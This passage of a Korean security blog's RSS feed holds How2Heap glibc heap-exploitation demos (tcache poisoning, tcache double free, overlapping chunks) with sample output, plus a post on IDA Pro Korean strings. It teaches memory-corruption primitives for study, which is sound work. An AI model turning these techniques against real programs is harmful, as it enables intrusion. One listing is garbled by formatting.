class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"tcache list : [ %p ]\n"</span>, &amp;stack_var);</span><br><span class="line"></span><br><span class="line"><span class="keyword">intptr_t</span> *b = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"2nd malloc(128): %p\n"</span>, b);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"조작에 성공했다.\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><center><p>이것은 malloc을 속여서 pointer를 임의의 위치(이 경우, 스택)로<br>반환하는 간단한 <code>tcache poisoning</code> 공격이다.<br>이 공격은 fastbin corruption 공격과 매우 비슷하다.</p><p>malloc()을 반환할 주소는 <code>0x7fffb6be4b80</code>이다.<br>buffer를 한 개 할당한다.<br><code>malloc(128): 0x55b69dc26260</code><br>buffer를 free한다.<br>-------free(a)-------<br><code>tcache list : [ 0x55b69dc26260 ]</code><br>조작할 위치(0x7fffb6be4b80)를 가리키도록 <code>0x55b69dc26260</code>에 있는 데이터의<br>처음 8 바이트(fd/next pointer)를 overwrite한다.<br><code>1st malloc(128): 0x55b69dc26260</code></p><h4 id="tcache-list-0x7fffb6be4b80"><a class="markdownIt-Anchor" href="#tcache-list-0x7fffb6be4b80"></a> <strong><code>tcache list : [ 0x7fffb6be4b80 ]</code></strong></h4><h4 id="2nd-malloc128-0x7fffb6be4b80"><a class="markdownIt-Anchor" href="#2nd-malloc128-0x7fffb6be4b80"></a> <strong><code>2nd malloc(128): 0x7fffb6be4b80</code></strong></h4><p>조작에 성공했다.</p></center>]]></content:encoded>
      
      <comments>http://j0n9hyun.github.io/2019/06/26/How2Heap-Tcache-Poisoning/#disqus_thread</comments>
    </item>
    
    <item>
      <title>[How2Heap] Tcache_dup</title>
      <link>http://j0n9hyun.github.io/2019/06/26/How2Heap-Tcache-dup/</link>
      <guid>http://j0n9hyun.github.io/2019/06/26/How2Heap-Tcache-dup/</guid>
      <pubDate>Wed, 26 Jun 2019 14:17:28 GMT</pubDate>
      <description>
      
        
        
          &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css&quot;&gt;&lt;h3 id=&quot;tcache_dup&quot;&gt;&lt;a class=&quot;markdownIt-
        
      
      </description>
      
      <content:encoded><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><h3 id="tcache_dup"><a class="markdownIt-Anchor" href="#tcache_dup"></a> Tcache_dup</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"simple double-free attack with tcache.\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"buffer를 할당한다.\n"</span>);</span><br><span class="line"><span class="keyword">int</span> *a = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"malloc(8): %p\n"</span>, a);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"free를 두 번 한다.\n"</span>);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"-------free(a)-------"</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"-------free(a)-------"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"free list : [ %p, %p ]\n"</span>, a, a);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"다음으로 할당되는 buffer가 동일할 것이다.\n"</span></span><br><span class="line">[ %p, %p ]\n<span class="string">", malloc(8), malloc(8));</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">return 0;</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure><center><p>simple double-free attack with tcache.<br>buffer를 할당한다.<br><code>malloc(8): 0x55fef5f8d260</code><br>free를 두 번 한다.<br><code>-------free(a)-------</code><br><code>-------free(a)-------</code></p><h4 id="free-list-0x55fef5f8d260-0x55fef5f8d260"><a class="markdownIt-Anchor" href="#free-list-0x55fef5f8d260-0x55fef5f8d260"></a> <strong><code>free list : [ 0x55fef5f8d260, 0x55fef5f8d260 ]</code></strong></h4><p>다음으로 할당되는 buffer가 동일할 것이다.</p><h4 id="0x55fef5f8d260-0x55fef5f8d260"><a class="markdownIt-Anchor" href="#0x55fef5f8d260-0x55fef5f8d260"></a> <strong><code>[ 0x55fef5f8d260, 0x55fef5f8d260 ]</code></strong></h4></center>]]></content:encoded>
      
      <comments>http://j0n9hyun.github.io/2019/06/26/How2Heap-Tcache-dup/#disqus_thread</comments>
    </item>
    
    <item>
      <title>[How2Heap] Overlapping_Chunks_2</title>
      <link>http://j0n9hyun.github.io/2019/06/26/How2Heap-Overlapping-Chunks-2/</link>
      <guid>http://j0n9hyun.github.io/2019/06/26/How2Heap-Overlapping-Chunks-2/</guid>
      <pubDate>Wed, 26 Jun 2019 13:51:17 GMT</pubDate>
      <description>
      
        
        
          &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css&quot;&gt;&lt;h3 id=&quot;overlapping_chunks_2&quot;&gt;&lt;a class=&quot;m
        
      
      </description>
      
      <content:encoded><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><h3 id="overlapping_chunks_2"><a class="markdownIt-Anchor" href="#overlapping_chunks_2"></a> Overlapping_Chunks_2</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">intptr_t</span> *p1,*p2,*p3,*p4,*p5,*p6;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> real_size_p1,real_size_p2,real_size_p3,real_size_p4,real_size_p5,real_size_p6;</span><br><span class="line"><span class="keyword">int</span> prev_in_use = <span class="number">0x1</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nsimple chunks overlapping problem"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\n이것은 인접하지 않은 free chunk를 consolidate하는 공격으로도 참조된다.\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nchunk 5개 할당"</span>);</span><br><span class="line"></span><br><span class="line">p1 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">p2 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">p3 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">p4 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">p5 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line">real_size_p1 = malloc_usable_size(p1);</span><br><span class="line">real_size_p2 = malloc_usable_size(p2);</span><br><span class="line">real_size_p3 = malloc_usable_size(p3);</span><br><span class="line">real_size_p4 = malloc_usable_size(p4);</span><br><span class="line">real_size_p5 = malloc_usable_size(p5);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\n\n%p ~ %p p1 chunk"</span>, p1, (<span class="keyword">unsigned</span> <span class="keyword">char</span> *)p1+malloc_usable_size(p1));</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\n%p ~ %p p2 chunk"</span>, p2,  (<span class="keyword">unsigned</span> <span class="keyword">char</span> *)p2+malloc_usable_size(p2));</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\n%p ~ %p p3 chunk"</span>, p3,  (<span class="keyword">unsigned</span> <span class="keyword">char</span> *)p3+malloc_usable_size(p3));</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\n%p ~ %p p4 chunk"</span>, p4, (<span class="keyword">unsigned</span> <span class="keyword">char</span> *)p4+malloc_usable_size(p4));</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\n%p ~ %p p5 chunk\n"</span>, p5,  (<span class="keyword">unsigned</span> <span class="keyword">char</span> *)p5+malloc_usable_size(p5));</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(p1,<span class="string">'A'</span>,real_size_p1);</span><br><span class="line"><span class="built_in">memset</span>(p2,<span class="string">'B'</span>,real_size_p2);</span><br><span class="line"><span class="built_in">memset</span>(p3,<span class="string">'C'</span>,real_size_p3);</span><br><span class="line"><span class="built_in">memset</span>(p4,<span class="string">'D'</span>,real_size_p4);</span><br><span class="line"><span class="built_in">memset</span>(p5,<span class="string">'E'</span>,real_size_p5);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\np4 chunk를 free해보자. 이 경우, p4이후에 p5가 top chunk에 접하고 있어서 top chunk와 합쳐지지 않는다\n"</span>); </span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(p4);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\n사용 중인 p2 chunk의 크기를 chunk_p2 + chunk_p3크기로 overwrite하는 p1 chunk취약점을 트리거하자.\n"</span>);</span><br><span class="line"></span><br><span class="line">*(<span class="keyword">unsigned</span> <span class="keyword">int</span> *)((<span class="keyword">unsigned</span> <span class="keyword">char</span> *)p1 + real_size_p1 ) = real_size_p2 + real_size_p3 + prev_in_use + <span class="keyword">sizeof</span>(<span class="keyword">size_t</span>) * <span class="number">2</span>; <span class="comment">//&lt;--- BUG HERE </span></span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\n이제 p2에 free()동작 중에 할당자는 다음 chunk가 p4라고 생각한다. (p2 + p2의 크기가 p4를 가리키기 때문)\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\n이 작업은 기본적으로 p3을 잘못 포함하는 큰 free chunk를 생성한다.\n"</span>);</span><br><span class="line"><span class="built_in">free</span>(p2);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\n이제 이전에 free된 chunk로 만족할 수 있는 크기의 새 chunk를 할당하자\n"</span>);</span><br><span class="line"></span><br><span class="line">p6 = <span class="built_in">malloc</span>(<span class="number">2000</span>);</span><br><span class="line">real_size_p6 = malloc_usable_size(p6);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nmalloc()은 우리의 만들어진 큰 free chunk에 의해 충족되었다. 이제 p6과 p3은 overlapping되어 우리는 p3에 있는 데이터를 p6 chunk에 쓰면서 overwrite할 수 있다."</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\n%p ~ %p p6 chunk "</span>, p6,  (<span class="keyword">unsigned</span> <span class="keyword">char</span> *)p6+real_size_p6);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\n%p ~ %p p3 chunk\n"</span>, p3, (<span class="keyword">unsigned</span> <span class="keyword">char</span> *) p3+real_size_p3); </span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\np3 chunk의 data: \n\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"%s\n"</span>,(<span class="keyword">char</span> *)p3); </span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\np6안에 뭔가 써보자.\n"</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"-------memset(p6,'F',1500)-------"</span>);</span><br><span class="line"><span class="built_in">memset</span>(p6,<span class="string">'F'</span>,<span class="number">1500</span>);  </span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\np3 chunk의 data: \n\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"%s\n"</span>,(<span class="keyword">char</span> *)p3); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>simple chunks overlapping problem</code><br>이것은 인접하지 않은 free chunk를 consolidate하는 공격으로도 참조된다.</p><p>heap에 chunk를 5개 할당한다.</p><p><code>0x603010 ~ 0x6033f8 p1 chunk</code><br><code>0x603400 ~ 0x6037e8 p2 chunk</code><br><code>0x6037f0 ~ 0x603bd8 p3 chunk</code><br><code>0x603be0 ~ 0x603fc8 p4 chunk</code><br><code>0x603fd0 ~ 0x6043b8 p5 chunk</code></p><p>p4 chunk를 <code>free</code>해보자. 이 경우, p4이후에 p5가 <code>top chunk</code>에 접하고 있어서 <code>top chunk</code>와 합쳐지지 않는다</p><p>사용 중인 p2 chunk의 크기를 chunk_p2 + chunk_p3크기로 overwrite하는 p1 chunk취약점을 트리거하자.</p><p>이제 p2에 free()동작 중에 할당자는 다음 chunk가 p4라고 생각한다. (p2 + p2의 크기가 p4를 가리키기 때문)</p><p>이 작업은 기본적으로 p3을 잘못 포함하는 큰 free chunk를 생성한다.</p><p>이제 이전에 free된 chunk로 만족할 수 있는 크기의 새 chunk를 할당하자</p><p>malloc()은 우리의 만들어진 큰 free chunk에 의해 충족되었다. 이제 p6과 p3은 overlapping되어 우리는 p3에 있는 데이터를 p6 chunk에 쓰면서 overwrite할 수 있다.<br><code>0x603400 ~ 0x603bd8 p6 chunk</code><br><code>0x6037f0 ~ 0x603bd8 p3 chunk</code></p><p><strong><code>p3 chunk의 data:</code></strong></p><p><codecode></p><p>p6안에 뭔가 써보자.<br>-------memset(p6,‘F’,1500)-------</p><p><strong><code>p3 chunk의 data:</code></strong></p><p><code>FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC</code></p>]]></content:encoded>
      
      <comments>http://j0n9hyun.github.io/2019/06/26/How2Heap-Overlapping-Chunks-2/#disqus_thread</comments>
    </item>
    
    <item>
      <title>IDA Pro 7.2 한글 스트링 지원</title>
      <link>http://j0n9hyun.github.io/2019/06/24/IDA-Pro-7-2-%ED%95%9C%EA%B8%80-%EC%8A%A4%ED%8A%B8%EB%A7%81-%EC%A7%80%EC%9B%90/</link>
      <guid>http://j0n9hyun.github.io/2019/06/24/IDA-Pro-7-2-%ED%95%9C%EA%B8%80-%EC%8A%A4%ED%8A%B8%EB%A7%81-%EC%A7%80%EC%9B%90/</guid>
      <pubDate>Mon, 24 Jun 2019 10:04:12 GMT</pubDate>
      <description>
      
        
        
          &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css&quot;&gt;&lt;h3 id=&quot;ida-pro-72-한글-스트링-지원&quot;&gt;&lt;a class=&quot;m
        
      
      </description>
      
      <content:encoded><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><h3 id="ida-pro-72-한글-스트링-지원"><a class="markdownIt-Anchor" href="#ida-pro-72-한글-스트링-지원"></a> IDA Pro 7.2 한글 스트링 지원</h3><p>7.0 버전까지만 해도 clt 파일을 따로 추가해줘야 했는데 7.2 부턴 그냥 한줄 추가만 해주면 된다. <a href="http://egloos.zum.com/shadowxx/v/11310107" target="_blank" rel="noopener">제작자</a>가 파일을 보냈다고 했는데 회사에서 잘 반영해준 것 같다. 상단의 주석에도 IDA 사용자가 제공해줬다고 적혀있다.</p><img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/60010989-d3e7b180-96b3-11e9-94e7-7a83b0a31d89.PNG"><center><small> [Korean.clt] </small><center> <br><br><img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/60011395-a94a2880-96b4-11e9-8ae8-860ac2d98aa7.PNG"><center><small> [IDA Pro 7.2] </small><center> <br><style>  img.border-shadow{        border:1px solid #888888;        box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19);    }</style></center></center></center></center>]]></content:encoded>
      
      <comments>http://j0n9hyun.github.io/2019/06/24/IDA-Pro-7-2-%ED%95%9C%EA%B8%80-%EC%8A%A4%ED%8A%B8%EB%A7%81-%EC%A7%80%EC%9B%90/#disqus_thread</comments>
    </item>
    
    <item>
      <title>[How2Heap] Overlapping_Chunks</title>
      <link>http://j0n9hyun.github.io/2019/06/20/How2Heap-Overlapping-Chunks/</link>
      <guid>http://j0n9hyun.github.io/2019/06/20/How2Heap-Overlapping-Chunks/</guid>
      <pubDate>Thu, 20 Jun 2019 13:59:02 GMT</pubDate>
      <description>
      
        
        
          &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css&quot;&gt;&lt;h3 id=&quot;overlapping_chunksc&quot;&gt;&lt;a class=&quot;ma
        
      
      </description>
      
      <content:encoded><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><h3 id="overlapping_chunksc"><a class="markdownIt-Anchor" href="#overlapping_chunksc"></a> Overlapping_Chunks.c</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc , <span class="keyword">char</span>* argv[])</span> </span>&#123;</span><br><span class="line"><span class="keyword">intptr_t</span> *p1,*p2,*p3,*p4;</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"이 기법은 glibc에서 tcache옵션이 disabled된 상태에만 작동한다.\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nsimple chunks overlapping\n\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"heap에 chunk 3개를 할당해보자.\n"</span>);</span><br><span class="line"></span><br><span class="line">p1 = <span class="built_in">malloc</span>(<span class="number">0x100</span> - <span class="number">8</span>);</span><br><span class="line">p2 = <span class="built_in">malloc</span>(<span class="number">0x100</span> - <span class="number">8</span>);</span><br><span class="line">p3 = <span class="built_in">malloc</span>(<span class="number">0x80</span> - <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"3개의 chunk가 여기에 할당됐다:\np1=%p\np2=%p\np3=%p\n"</span>, p1, p2, p3);</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(p1, <span class="string">'1'</span>, <span class="number">0x100</span> - <span class="number">8</span>);</span><br><span class="line"><span class="built_in">memset</span>(p2, <span class="string">'2'</span>, <span class="number">0x100</span> - <span class="number">8</span>);</span><br><span class="line"><span class="built_in">memset</span>(p3, <span class="string">'3'</span>, <span class="number">0x80</span> - <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\n이제 p2 chunk를 free시켜보자\n"</span>);</span><br><span class="line"><span class="built_in">free</span>(p2);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"p2 chuck는 이제 unsorted bin안에서 그 크기의 새로운 malloc()을 제공할 준비가 되어있다\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"이제 p2를 free시킨 chunk의 크키를 overwrite할 수 있는 overflow를 시연해보자.\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"toy 프로그램의 경우, 마지막 세 개의 bit값은 중요하지 않다;"</span></span><br><span class="line"><span class="string">"하지만, heap의 안정성을 유지하는 것이 베스트다.\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"이 안정성을 유지하기 위해 우리는 최하위 bit를 1(prev_inuse)로 표시할 것이다,"</span></span><br><span class="line"><span class="string">"p1이 free chunk로 오인하지 않고 확실히 하기 위해\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> evil_chunk_size = <span class="number">0x181</span>;</span><br><span class="line"><span class="keyword">int</span> evil_region_size = <span class="number">0x180</span> - <span class="number">8</span>;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"우리는 p2 chunk의 크기를 %d로 설정할 것이다, 그렇게 하는 것은 우리에게 \n%d의 region size를 준다.\n"</span>,</span><br><span class="line">evil_chunk_size, evil_region_size);</span><br><span class="line"></span><br><span class="line">*(p2<span class="number">-1</span>) = evil_chunk_size; <span class="comment">// 우리는 p2 chunk의 "크기" field를 overwrite하고 있다.</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\n이제 다른 chunk를 주입된 p2 chunk의 데이터 크기와 똑같은 크기에 할당해준다.\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"이 malloc은 우리가 크기를 바꾸었던, unsorted bin안에 있는, 전에 free되었던 chunk로부터 제공되어질 것이다.\n"</span>);</span><br><span class="line">p4 = <span class="built_in">malloc</span>(evil_region_size);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\np4는 %p에 할당되었고 and %p에서 끝난다.\n"</span>, (<span class="keyword">char</span> *)p4, (<span class="keyword">char</span> *)p4+evil_region_size);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"p3는 %p에서 시작해 %p에서 끝난다\n"</span>, (<span class="keyword">char</span> *)p3, (<span class="keyword">char</span> *)p3+<span class="number">0x80</span><span class="number">-8</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"p4는 p3와 overlap되어야한다, 이 경우에 p4는 모든 p3를 